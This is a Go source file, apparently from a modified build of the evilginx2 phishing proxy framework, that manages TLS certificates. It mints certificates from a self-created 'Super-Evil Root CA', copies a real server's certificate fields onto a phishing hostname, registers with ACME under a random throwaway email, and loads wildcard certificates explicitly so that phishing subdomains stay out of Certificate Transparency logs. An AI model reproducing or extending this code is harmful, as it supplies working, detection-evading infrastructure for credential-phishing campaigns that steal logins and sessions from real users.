package core

import (
    "context"
    "crypto/rand"
    "crypto/rsa"
    "crypto/tls"
    "crypto/x509"
    "crypto/x509/pkix"
    "encoding/pem"
    "fmt"
    "math/big"
    "os"
    "path/filepath"
    "strings"
    "time"

    "github.com/kgretzky/evilginx2/log"

    "github.com/caddyserver/certmagic"
)

type CertDb struct {
    cache_dir       string
    magic           *certmagic.Config
    cfg             *Config
    ns              *Nameserver
    caCert          tls.Certificate
    tlsCache        map[string]*tls.Certificate
    wildcardCert    *tls.Certificate
    wildcardDomain  string
}

func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver) (*CertDb, error) {
    os.Setenv("XDG_DATA_HOME", cache_dir)

    o := &CertDb{
        cache_dir: cache_dir,
        cfg:       cfg,
        ns:        ns,
        tlsCache:  make(map[string]*tls.Certificate),
    }

    if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
        return nil, err
    }

    certmagic.DefaultACME.Agreed = true
    certmagic.DefaultACME.Email = o.GetEmail()

    err := o.generateCertificates()
    if err != nil {
        return nil, err
    }
    err = o.reloadCertificates()
    if err != nil {
        return nil, err
    }

    o.magic = certmagic.NewDefault()

    // Auto-load wildcard certificate (CT logs fix)
    wildcardPaths := []struct {
        cert, key string
    }{
        {filepath.Join(o.cache_dir, "wildcard", "fullchain.pem"), filepath.Join(o.cache_dir, "wildcard", "privkey.pem")},
        {filepath.Join(o.cache_dir, "wildcard.pem"), filepath.Join(o.cache_dir, "wildcard.key")},
        {"/etc/evilginx/certs/fullchain.pem", "/etc/evilginx/certs/privkey.pem"},
    }

    for _, wp := range wildcardPaths {
        if _, err := os.Stat(wp.cert); err == nil {
            if _, err := os.Stat(wp.key); err == nil {
                domain := o.cfg.GetBaseDomain()
                if domain != "" {
                    if err := o.LoadWildcardCert(wp.cert, wp.key, domain); err != nil {
                        log.Error("wildcard certificate: %v", err)
                    } else {
                        break
                    }
                }
            }
        }
    }

    if o.wildcardCert == nil {
        log.Info("no wildcard certificate found - using per-hostname ACME certificates")
        log.Warning("individual subdomains WILL appear in Certificate Transparency (crt.sh)")
    } else {
        log.Success("wildcard certificate loaded for *." + o.wildcardDomain + " → CT logs will no longer expose subdomains")
    }

    return o, nil
}

func (o *CertDb) GetEmail() string {
    var email string
    fn := filepath.Join(o.cache_dir, "email.txt")

    data, err := ReadFromFile(fn)
    if err != nil {
        email = strings.ToLower(GenRandomString(3) + "@" + GenRandomString(6) + ".com")
        if SaveToFile([]byte(email), fn, 0600) != nil {
            log.Error("saving email error: %s", err)
        }
    } else {
        email = strings.TrimSpace(string(data))
    }
    return email
}

func (o *CertDb) generateCertificates() error {
    var key *rsa.PrivateKey

    pkey, err := os.ReadFile(filepath.Join(o.cache_dir, "private.key"))
    if err != nil {
        pkey, err = os.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
    }

    if err != nil {
        os.RemoveAll(filepath.Join(o.cache_dir, "*"))

        key, err = rsa.GenerateKey(rand.Reader, 2048)
        if err != nil {
            return fmt.Errorf("private key generation failed")
        }
        pkey = pem.EncodeToMemory(&pem.Block{
            Type:  "RSA PRIVATE KEY",
            Bytes: x509.MarshalPKCS1PrivateKey(key),
        })
        err = os.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
        if err != nil {
            return err
        }
    } else {
        block, _ := pem.Decode(pkey)
        if block == nil {
            return fmt.Errorf("private key is corrupted")
        }

        key, err = x509.ParsePKCS1PrivateKey(block.Bytes)
        if err != nil {
            return err
        }
    }

    ca_cert, err := os.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
    if err != nil {
        notBefore := time.Now()
        aYear := time.Duration(10*365*24) * time.Hour
        notAfter := notBefore.Add(aYear)
        serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
        serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
        if err != nil {
            return err
        }

        template := x509.Certificate{
            SerialNumber: serialNumber,
            Subject: pkix.Name{
                Organization: []string{"Evilginx Signature Trust Co."},
                CommonName:   "Evilginx Super-Evil Root CA",
            },
            NotBefore:             notBefore,
            NotAfter:              notAfter,
            KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
            ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
            BasicConstraintsValid: true,
            IsCA:                  true,
        }

        cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
        if err != nil {
            return err
        }
        ca_cert = pem.EncodeToMemory(&pem.Block{
            Type:  "CERTIFICATE",
            Bytes: cert,
        })
        err = os.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
        if err != nil {
            return err
        }
    }

    o.caCert, err = tls.X509KeyPair(ca_cert, pkey)
    if err != nil {
        return err
    }
    return nil
}

func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
    ctx, cancel := context.WithTimeout(context.Background(), t)
    err := o.magic.ManageSync(ctx, hosts)
    cancel()
    return err
}

func (o *CertDb) setUnmanagedSync(verbose bool) error {
    sitesDir := filepath.Join(o.cache_dir, "sites")

    files, err := os.ReadDir(sitesDir)
    if err != nil {
        return fmt.Errorf("failed to list certificates in directory '%s': %v", sitesDir, err)
    }

    for _, f := range files {
        if f.IsDir() {
            certDir := filepath.Join(sitesDir, f.Name())

            certFiles, err := os.ReadDir(certDir)
            if err != nil {
                return fmt.Errorf("failed to list certificate directory '%s': %v", certDir, err)
            }

            var certPath, keyPath string

            var pemCnt, crtCnt, keyCnt int
            for _, cf := range certFiles {
                if !cf.IsDir() {
                    switch strings.ToLower(filepath.Ext(cf.Name())) {
                    case ".pem":
                        pemCnt += 1
                        if certPath == "" {
                            certPath = filepath.Join(certDir, cf.Name())
                        }
                        if cf.Name() == "fullchain.pem" {
                            certPath = filepath.Join(certDir, cf.Name())
                        }
                        if cf.Name() == "privkey.pem" {
                            keyPath = filepath.Join(certDir, cf.Name())
                        }
                    case ".crt":
                        crtCnt += 1
                        if certPath == "" {
                            certPath = filepath.Join(certDir, cf.Name())
                        }
                    case ".key":
                        keyCnt += 1
                        if keyPath == "" {
                            keyPath = filepath.Join(certDir, cf.Name())
                        }
                    }
                }
            }
            if pemCnt > 0 && crtCnt > 0 {
                if verbose {
                    log.Warning("cert_db: found multiple .crt and .pem files in the same directory: %s", certDir)
                }
                continue
            }
            if certPath == "" {
                if verbose {
                    log.Warning("cert_db: not a single public certificate found in directory: %s", certDir)
                }
                continue
            }
            if keyPath == "" {
                if verbose {
                    log.Warning("cert_db: not a single private key found in directory: %s", certDir)
                }
                continue
            }

            log.Debug("caching certificate: cert:%s key:%s", certPath, keyPath)
            ctx := context.Background()
            _, err = o.magic.CacheUnmanagedCertificatePEMFile(ctx, certPath, keyPath, []string{})
            if err != nil {
                if verbose {
                    log.Error("cert_db: failed to load certificate key-pair: %v", err)
                }
                continue
            }
        }
    }
    return nil
}

func (o *CertDb) reloadCertificates() error {
    // TODO: load private certificates from disk
    return nil
}

func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
    log.Debug("Fetching TLS certificate for %s:%d ...", host, port)

    config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
    conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
    if err != nil {
        return nil, err
    }
    defer conn.Close()

    state := conn.ConnectionState()

    return state.PeerCertificates[0], nil
}

func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
    var x509ca *x509.Certificate
    var template x509.Certificate

    cert, ok := o.tlsCache[host]
    if ok {
        return cert, nil
    }

    if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
        return
    }

    if phish_host == "" {
        serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
        serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
        if err != nil {
            return nil, err
        }

        template = x509.Certificate{
            SerialNumber:          serialNumber,
            Issuer:                x509ca.Subject,
            Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
            NotBefore:             time.Now(),
            NotAfter:              time.Now().Add(time.Hour * 24 * 180),
            KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
            ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
            DNSNames:              []string{host},
            BasicConstraintsValid: true,
        }
        template.Subject.CommonName = host
    } else {
        srvCert, err := o.getTLSCertificate(host, port)
        if err != nil {
            return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
        } else {
            serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
            serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
            if err != nil {
                return nil, err
            }

            template = x509.Certificate{
                SerialNumber:          serialNumber,
                Issuer:                x509ca.Subject,
                Subject:               srvCert.Subject,
                NotBefore:             srvCert.NotBefore,
                NotAfter:              time.Now().Add(time.Hour * 24 * 180),
                KeyUsage:              srvCert.KeyUsage,
                ExtKeyUsage:           srvCert.ExtKeyUsage,
                IPAddresses:           srvCert.IPAddresses,
                DNSNames:              []string{phish_host},
                BasicConstraintsValid: true,
            }
            template.Subject.CommonName = phish_host
        }
    }

    var pkey *rsa.PrivateKey
    if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
        return
    }

    var derBytes []byte
    if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
        return
    }

    cert = &tls.Certificate{
        Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
        PrivateKey:  pkey,
    }

    o.tlsCache[host] = cert
    return cert, nil
}

// LoadWildcardCert loads a wildcard TLS certificate from PEM files on disk.
func (o *CertDb) LoadWildcardCert(certFile, keyFile, domain string) error {
    cert, err := tls.LoadX509KeyPair(certFile, keyFile)
    if err != nil {
        return fmt.Errorf("failed to load wildcard certificate: %v", err)
    }
    o.wildcardCert = &cert
    o.wildcardDomain = domain
    log.Info("wildcard certificate loaded for *." + domain)
    log.Info("individual subdomains will NOT appear in Certificate Transparency logs")
    return nil
}

// GetCertificate returns the appropriate TLS certificate for a TLS handshake.
func (o *CertDb) GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
    if o.wildcardCert != nil && o.wildcardDomain != "" {
        sniHost := strings.ToLower(hello.ServerName)
        if sniHost == o.wildcardDomain || strings.HasSuffix(sniHost, "."+o.wildcardDomain) {
            return o.wildcardCert, nil
        }
    }
    return o.magic.GetCertificate(hello)
}
